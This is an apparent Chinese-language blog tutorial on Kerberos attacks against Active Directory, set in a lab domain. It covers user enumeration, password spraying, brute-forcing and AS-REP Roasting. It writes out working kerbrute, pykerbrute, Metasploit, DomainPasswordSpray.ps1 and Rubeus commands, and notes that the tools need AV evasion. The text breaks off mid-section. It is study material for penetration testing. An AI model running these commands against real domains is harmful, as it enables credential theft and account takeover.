

<!DOCTYPE html>
<html lang="en" color-mode=light>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Kerberos攻击 - Charmy&#39;s blog</title>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="google" content="notranslate" />
  <meta name="keywords" content=", 内网学习, Kerberos">
  <meta name="description" content="Kerberos认证基础kerberos认证协议是基于...">
  <meta name="author" content="John Doe">
  <link rel="icon" href="/images/icons/16x16.png" type="image/png" sizes="16x16">
  <link rel="icon" href="/images/icons/32x32.png" type="image/png" sizes="32x32">
  <link rel="apple-touch-icon" href="/images/icons/180x180.png" sizes="180x180">
  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
  
    <meta rel="msapplication-TileImage" content="/images/icons/144x144.png">
    <meta rel="msapplication-TileColor" content="#000000">
  

  
<link rel="stylesheet" href="/css/style.css">


  
    
<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">

  

  
    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">

  

  
    
      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">

      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">

      
  

  <script>
    var CONFIG = window.CONFIG || {};
    var ZHAOO = window.ZHAOO || {};
    CONFIG = {
      isHome: false,
      fancybox: true,
      pjax: false,
      loading: {
        gif: '/images/theme/loading.gif',
        lottie: ''
      },
      lazyload: {
        enable: true,
        only_post: 'false',
        loading: {
          gif: '/images/theme/loading.gif',
          lottie: ''
        }
      },
      donate: {
        enable: false,
        alipay: 'https://pic.izhaoo.com/alipay.jpg',
        wechat: 'https://pic.izhaoo.com/wechat.jpg'
      },
      galleries: {
        enable: true
      },
      fab: {
        enable: true,
        always_show: false
      },
      carrier: {
        enable: false
      },
      daovoice: {
        enable: false
      },
      preview: {
        background: {
          default: '',
          api: ''
        },
        motto: {
          default: '埋下一个梦，待它破土而出。',
          typing: true,
          api: 'https://v2.jinrishici.com/one.json',
          data_contents: '["data","content"]'
        },
      },
      qrcode: {
        enable: false,
        type: 'url',
        image: 'https://pic.izhaoo.com/weapp-code.jpg',
      },
      toc: {
        enable: true
      },
      scrollbar: {
        type: 'default'
      },
      notification: {
        enable: false,
        delay: 4500,
        list: '',
        page_white_list: '',
        page_black_list: ''
      },
      search: {
        enable: true,
        path: 'myblog/node_modules/hexo-generator-searchdb/templates/search.xml'
      }
    }
  </script>

  

  

<meta name="generator" content="Hexo 5.4.2"></head>

<body class="lock-screen">
  <div class="loading" id="loading"></div>
  
    


  <nav class="navbar">
    <div class="left">
      
        <i class="iconfont iconhome j-navbar-back-home"></i>
      
      
      
        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
      
      
        <i class="iconfont iconsearch j-navbar-search"></i>
      
    </div>
    <div class="center">Kerberos攻击</div>
    <div class="right">
      <i class="iconfont iconmenu j-navbar-menu"></i>
    </div>
    
  </nav>

  
  

<nav class="menu">
  <div class="menu-container">
    <div class="menu-close">
      <i class="iconfont iconbaseline-close-px"></i>
    </div>
    <ul class="menu-content"><li class="menu-item">
        <a href="/ " class="underline "> 首页</a>
      </li><li class="menu-item">
        <a href="/galleries/ " class="underline "> 随拍</a>
      </li><li class="menu-item">
        <a href="/archives/ " class="underline "> 归档</a>
      </li><li class="menu-item">
        <a href="/tags/ " class="underline "> 标签</a>
      </li><li class="menu-item">
        <a href="/categories/ " class="underline "> 分类</a>
      </li><li class="menu-item">
        <a href="/about/ " class="underline "> 关于</a>
      </li></ul>
    
      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
    
  </div>
</nav>
  <main id="main">
  <div class="article-wrap">
    <div class="row container">
      <div class="col-xl-3"></div>
      <div class="col-xl-6"><article class="article">
  <div class="wrap">
    <section class="head">
  <img   class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/blog-pictures/05.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
  <div class="head-mask">
    <h1 class="head-title">Kerberos攻击</h1>
    <div class="head-info">
      <span class="post-info-item"><i class="iconfont iconcalendar"></i>March 04, 2023</span>
      
      <span class="post-info-item"><i class="iconfont iconfont-size"></i>26845</span>
    </div>
  </div>
</section>
    <section class="main">
      <section class="content">
        
        <h1 id="Kerberos认证基础"><a href="#Kerberos认证基础" class="headerlink" title="Kerberos认证基础"></a>Kerberos认证基础</h1><p><font color='red'>kerberos认证协议是基于票据的认证方式</font></p>
<p>kerberos分为三部分：用户、服务器、KDC（Key Distribution Center）</p>
<p>KDC包含：AS（Authentication Server）、TGS（Ticket Granting Server）</p>
<h2 id="kerberos基础认证流程"><a href="#kerberos基础认证流程" class="headerlink" title="kerberos基础认证流程"></a>kerberos基础认证流程</h2><p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/91C85F3DF584F41878C343B204E1DEC2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">91C85F3DF584F41878C343B204E1DEC2</span></p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/aaa.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">aaa</span></p>
<p>kerberos认证，其实就是类似于参观一个实验室，普通人只能参观展品、高级访客可以进入内部参观</p>
<p>前提是你得提前预约获得一个密码，成为高级访客</p>
<p>你进实验室时，在门禁处输入你的账号密码，AS验证是否正确，然后返回你一个临时参观证，临时参观证由你的信息和访问权限组成，并且用krbtgt加密</p>
<p>比如你现在想要参观实验室里面的武器库（你要访问的服务）</p>
<p>你到申请处（TGS）进行申请，扫描参观证，输入你要参观的地方（server），申请处对你的参观证进行验证，成功之后，用武器库的密码加密，得到一个门禁卡（TGS票据）</p>
<p>到达武器库，扫描门禁卡，进行访问</p>
<p>这里面是有漏洞的</p>
<p>1.如果krbtgt密码被知道，就可以任意伪造参观证</p>
<p>2.如果武器库密码泄露，是不是就是任何人可以访问，前提是武器库没有设置PAC（即返回KDC确认）</p>
<h2 id="kerberos攻击分类"><a href="#kerberos攻击分类" class="headerlink" title="kerberos攻击分类"></a>kerberos攻击分类</h2><p>上面分析可知，kerberos一般就在AS阶段、TGS阶段、PAC</p>
<p>AS阶段</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">域内用户枚举<br>密码喷洒<br>AS_REP Roasting<br>黄金票据<br></code></pre></td></tr></table></figure>



<p>TGS阶段</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">kerberosast攻击<br>白银票据<br>委派攻击<br></code></pre></td></tr></table></figure>



<p>PAC</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span><br><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">42278</span><br><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">42287</span><br></code></pre></td></tr></table></figure>







<h1 id="AS阶段攻击"><a href="#AS阶段攻击" class="headerlink" title="AS阶段攻击"></a>AS阶段攻击</h1><h2 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h2><p>在没有域内任何的凭据的前提下，枚举出域内用户名</p>
<p>当我们不在域内，但是发现了一个域，此时就可以考虑先枚举出域内用户，然后再进行密码喷洒攻击</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理是用到kerberos协议的AS_REQ</p>
<p>当域内用户的状态不同时，AS_REP包返回的数据是不同的</p>
<p>AS_REQ包里面的cname的值就是用户名字</p>
<p>用户的不同状态对应的AS_REP返回包</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">用户存在并且启用		KDC_ERR_PREAUTH_REQUIRED<br><br>用户存在但是禁用		KDC_ERR_CLIENT_REVOKED NT <span class="hljs-keyword">Status</span>: STATUS_ACCOUNT_DISABLED<br><br>用户不存在			   KDC_ERR_C_PRINCIPAL_UNKNOWN<br></code></pre></td></tr></table></figure>

<p>通过不同的返回包，就能确定某个账户是否存在</p>
<h3 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h3><p><font color='red'>前提是有一台能够与域控通信的计算机，不管登陆账户是否为域用户，只要能和域控通信就行</font></p>
<h4 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span>语言编写的用于<br>用户名枚举、密码喷洒的工具<br></code></pre></td></tr></table></figure>



<p>地址</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ropnop/</span>kerbrute<br></code></pre></td></tr></table></figure>



<p>前提</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">域内主机，但是用非域内账号登陆<br><br>非域内主机，但是能够和域控通信<br><br>总的来说，就是一台能够与域控通信的计算机就行<br><br>其次，下载时windows检测到病毒，需要做免杀<br></code></pre></td></tr></table></figure>



<p>用法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> userenum <span class="hljs-attr">--dc</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> -d sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span><br><br><span class="hljs-selector-id">#userenum</span>:枚举模式<br>#<span class="hljs-attr">--dc</span>：域控ip<br>#-d：域名<br><span class="hljs-selector-id">#user</span><span class="hljs-selector-class">.txt</span>:用户名字典，不需要加域名后缀<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230212224329512.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230212224329512</span></p>
<h4 id="pykerbrute"><a href="#pykerbrute" class="headerlink" title="pykerbrute"></a>pykerbrute</h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel">更kerbrute功能一样<br>但是是用<span class="hljs-keyword">python</span>语言编写<br>有tcp和udp两种工作模式<br><br>不需要做免杀，只是一个<span class="hljs-keyword">python</span>脚本<br></code></pre></td></tr></table></figure>



<p>用法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#TCP模式</span><br>python2 EnumADUser.py <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms.<span class="hljs-keyword">local</span> <span class="hljs-keyword">user</span>.txt udp<br><br><span class="hljs-meta">#UDP模式</span><br>python2 EnumADUser.py <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms.<span class="hljs-keyword">local</span> <span class="hljs-keyword">user</span>.txt tcp<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230212231057818.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230212231057818</span></p>
<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>作为一个很牛逼的工具msf，它也有用户枚举的功能</p>
<p>在</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/gather/</span>kerberos_enumusers<br></code></pre></td></tr></table></figure>



<p>使用命令</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/gather/kerberos_enumusers<br><span class="hljs-keyword">set</span> domain <span class="hljs-comment">sayms.local</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.8.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">user_file user.txt</span><br>run<br></code></pre></td></tr></table></figure>

<p>大同小异，都是需要知道域名、ip、还有用户名字典</p>
<h3 id="枚举抓包分析"><a href="#枚举抓包分析" class="headerlink" title="枚举抓包分析"></a>枚举抓包分析</h3><p>我们开始之前，先用wireshark捕获192.168.8.2这个本地连接的数据包</p>
<p>然后运行工具</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093328742.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213093328742</span></p>
<p>捕获的数据包</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093454761.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213093454761</span></p>
<p>可以看到返回的结果</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093534288.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213093534288</span></p>
<p>根据这个判断域内用户是否存在</p>
<p>看一个成功的数据包</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093733082.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213093733082</span></p>
<p>说明tony这个用户就是域用户</p>
<h2 id="域内密码喷洒"><a href="#域内密码喷洒" class="headerlink" title="域内密码喷洒"></a>域内密码喷洒</h2><p>普通的密码爆破是用固定的用户名然后去爆破密码，但是这样账户登陆可能容易被锁定</p>
<p>密码喷洒，是用固定的密码，去爆破用户名</p>
<p>简而言之，就是一个密码，域内哪些用户用这个密码</p>
<p>因为域管理员为了方便记忆管理，一些用户的密码，可能会设置一样</p>
<p>当然前提是你得先域内用户枚举，找到域内存在哪些用户</p>
<h3 id="密码锁定策略"><a href="#密码锁定策略" class="headerlink" title="密码锁定策略"></a>密码锁定策略</h3><p>刚才说了，直接爆破密码，很容易导致账户锁定</p>
<p>只有没开启密码锁定策略，就可以爆破</p>
<p>通过powershell的命令，可以查询密码锁定策略</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ADDefaultDomainPasswordPolicy</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213114120853.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213114120853</span></p>
<p>默认是0，就是没有设置次数锁定，可以进行爆破</p>
<p>一般默认是没有开启的，可以爆破</p>
<h3 id="工具喷洒"><a href="#工具喷洒" class="headerlink" title="工具喷洒"></a>工具喷洒</h3><h4 id="kerbrute-1"><a href="#kerbrute-1" class="headerlink" title="kerbrute"></a>kerbrute</h4><p>kerbrute不仅可以用户枚举还可以密码喷洒</p>
<p>密码喷洒</p>
<p>用法</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nsis">kerbrute_windows_amd64.exe passwordspray --dc <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> -d sayms.local <span class="hljs-literal">user</span>.txt <span class="hljs-literal">admin</span>!@<span class="hljs-comment">#45</span><br><br><span class="hljs-comment">#passwordspray：密码喷洒模式</span><br><span class="hljs-comment">#--dc：域控ip</span><br><span class="hljs-comment">#-d：域名</span><br><span class="hljs-comment">#user.txt：域内用户</span><br><span class="hljs-comment">#123456：密码</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213112929229.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213112929229</span></p>
<p>当然如果域内没有设置账户锁定，直接爆破密码当然是更方便的</p>
<p>密码爆破</p>
<p>用法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> bruteuser <span class="hljs-attr">--dc</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> -d sayms<span class="hljs-selector-class">.local</span> passwords<span class="hljs-selector-class">.txt</span> administrator<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213113426449.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213113426449</span></p>
<h4 id="pykerbrute-1"><a href="#pykerbrute-1" class="headerlink" title="pykerbrute"></a>pykerbrute</h4><p>和kerbrute差不多，不同的是</p>
<p><font color='red'>pykerbrute使用密码喷洒，可以是明文密码也可以是hash值</font></p>
<p>用法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#明文喷洒<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> clearpassword <span class="hljs-number">123456</span> tcp<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> clearpassword <span class="hljs-number">123456</span> udp<br><br>#hash密码喷洒<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> ntlmhsh 哈希值 tcp<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> ntlmhsh 哈希值 udp<br></code></pre></td></tr></table></figure>





<h4 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h4><p>改脚本需要在域内计算机上使用powershell运行</p>
<p><font color='red'>powershell4.0的版本中该脚本不能执行</font></p>
<p><font color='red'>该脚本必须是域用户登陆的计算机执行，才能成功</font></p>
<p>因为该脚本是利用LDAP从域中导出用户列表，然后去除被锁定账户，再进行密码喷洒</p>
<p>用法</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">powershell -exec bypass<br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span>. \DomainPasswordSpray.ps1<br>Invoke-DomainPasswordSpray -Password <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213122805639.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213122805639</span></p>
<h3 id="密码喷洒数据包分析"><a href="#密码喷洒数据包分析" class="headerlink" title="密码喷洒数据包分析"></a>密码喷洒数据包分析</h3><p>首先进行喷洒</p>
<p>抓取数据包</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213125247223.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213125247223</span></p>
<p>如上</p>
<p>只有这一组AS_REP数据包返回结果正常</p>
<p>证明喷洒成功一个</p>
<p>喷洒失败的数据包</p>
<p>回显示krb-error</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213125502950.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213125502950</span></p>
<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS_REP Roasting"></a>AS_REP Roasting</h2><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>一种对用户账户进行离线爆破的方式</p>
<p>需要被攻击的账号开启    “<font color='red'>不需要Kerberos预身份认证</font>”</p>
<p>但是</p>
<p>这个选项默认不开启</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213180646969.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213180646969</span></p>
<p>“不需要Kerberos预身份认证”的主要作用就是    防止密码离线爆破</p>
<p>关闭之后</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">攻击者使用指定账户向域控的kerberos <span class="hljs-number">88</span>端口发送数据包<br><br>此时域控不会进行验证<br><br>直接返回TGT和用改用户hash加密的<span class="hljs-keyword">Login</span> <span class="hljs-keyword">session</span> key<br></code></pre></td></tr></table></figure>



<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>攻击过程总的来说分两步</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">获取<span class="hljs-built_in">hash</span>加密的Login session key<br><br>解密<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>



<p>当然首要的还是找到    设置了“不需要Kerberos预身份认证”的用户</p>
<p>还需要能和Kerberos 88端口通信的主机</p>
<h3 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h3><p>我们需要的hash在</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">AS_REP响应包最外层的ecp-<span class="hljs-keyword">part</span>的cipher部分<br></code></pre></td></tr></table></figure>



<h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>该工具比较人性</p>
<p>它会自动筛选找到域中设置了“不需要Kerberos预身份认证”的用户</p>
<p>然后以改用户的身份发送AS_REQ包</p>
<p>最后将返回的hash加密的Login session key，以<font color='red'>John那个解密的格式放在hash.txt文件中</font></p>
<p>简而言之就是，自动筛选、自动发送、自动转换、自动保存</p>
<p>注意</p>
<p><font color='red'>必须是用域账户登陆的主机才行，本地账户登陆的域主机是无法成功的</font></p>
<p>用法</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Rubeus.exe asreproast <span class="hljs-regexp">/format:john /</span>outfile:hash.txt<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213191034323.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213191034323</span></p>
<h4 id="ASREPRoast-ps1脚本"><a href="#ASREPRoast-ps1脚本" class="headerlink" title="ASREPRoast.ps1脚本"></a>ASREPRoast.ps1脚本</h4><p>功能作用和rubeus一样</p>
<p>不同的是它没有自动过滤出hash，需要用命令导出</p>
<p>注意</p>
<p><font color='red'>必须是用域账户登陆的主机才行，本地账户登陆的域主机是无法成功的</font></p>
<p>用法</p>
<figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-meta">#用cmd打开powershell</span><br>powershell -exec bypass<span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#命令</span><br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\ASREPRoast.ps1<br><br>Invoke-ASREPRoast | <span class="hljs-keyword">select</span> -ExpandProperty Hash<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213202229163.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230213202229163</span></p>
<h4 id="非域内机器"><a href="#非域内机器" class="headerlink" title="非域内机器"></a>非域内机器</h4><p>上面两个方法，都是基于有一个域内的主机进行测试的，如果我知道了域内的一个账号密码，但是没有域主机，咋办</p>
<p>下面就提出了解决办法</p>
<p>前提</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">拥有一个域内账号密码<br></code></pre></td></tr></table></figure>



<p>思路</p>
